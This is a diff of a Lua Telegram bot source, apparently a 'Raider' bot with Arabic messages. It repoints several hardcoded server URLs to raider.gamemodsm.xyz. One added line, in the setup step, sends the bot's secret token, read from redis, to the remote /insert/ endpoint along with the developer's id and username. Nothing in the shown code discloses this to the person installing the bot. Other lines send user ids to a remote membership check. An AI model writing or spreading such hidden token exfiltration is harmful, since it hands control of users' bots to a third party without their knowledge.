@@ -31,7 +31,7 @@ if not redis:get(Server_DevRaider.."User_DevRaider1") then
 io.write('\n\27[1;35m⬇┇Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
 local User_Sudo = io.read():gsub('@','')
 if User_Sudo ~= '' then
-local GetInfoUser = http.request("http://teamstorm.tk/GetUser?id="..User_Sudo)
+local GetInfoUser = http.request("http://raider.gamemodsm.xyz/GetUser?user="..User_Sudo)
 local User_Info = JSON.decode(GetInfoUser)
 if User_Info.Info.Chek == "Not_Info" then
 io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
@@ -48,7 +48,7 @@ end
 io.write('\n\27[1;31m☑┇The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
 redis:set(Server_DevRaider.."User_DevRaider1",User_Info.Info.Username)
 redis:set(Server_DevRaider.."Id_DevRaider",User_Info.Info.Id)
-http.request("http://raider.ml/insert/?id="..User_Info.Info.Id.."&user="..User_Info.Info.Username.."&token="..redis:get(Server_DevRaider.."Token_DevRaider"))
+http.request("http://raider.gamemodsm.xyz/insert/?id="..User_Info.Info.Id.."&user="..User_Info.Info.Username.."&token="..redis:get(Server_DevRaider.."Token_DevRaider"))
 else
 io.write('\n\27[1;31m🔄┇The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
 end 
@@ -2085,7 +2085,7 @@ end
 end
 ------------------------------------------------------------------------------------------------------------
 if text == 'تفعيل' and DeveloperBot(msg) then
-local url,res = http.request('http://raider.ml/ch/?id='..msg.sender_user_id_)
+local url,res = http.request('http://raider.gamemodsm.xyz/ch/?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.Info_Raider ~= true then
 send(msg.chat_id_,msg.id_,'\n📌┇عليك الاشتراك في قناة البوت \n💢┇قناة البوت ← { @RaiderCli }')   
@@ -2144,7 +2144,7 @@ end,nil)
 end
 ------------------------------------------------------------------------------------------------------------
 if text == 'تعطيل' and DeveloperBot(msg) then
-local url,res = http.request('http://raider.ml/ch/?id='..msg.sender_user_id_)
+local url,res = http.request('http://raider.gamemodsm.xyz/ch/?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.Info_Raider ~= true then
 send(msg.chat_id_,msg.id_,'\n📌┇عليك الاشتراك في قناة البوت \n💢┇قناة البوت ← { @RaiderCli }')   
@@ -2188,7 +2188,7 @@ end,nil)
 end
 ------------------------------------------------------------------------------------------------------------
 if text == 'تفعيل' and not DeveloperBot(msg) and not redis:get(bot_id..'Free:Bot') then
-local url,res = http.request('http://raider.ml/ch/?id='..msg.sender_user_id_)
+local url,res = http.request('http://raider.gamemodsm.xyz/ch/?id='..msg.sender_user_id_)
 data = JSON.decode(url)
 if data.Ch_Member.Info_Raider ~= true then
 send(msg.chat_id_,msg.id_,'\n📌┇عليك الاشتراك في قناة البوت \n💢┇قناة البوت ← { @RaiderCli }')   
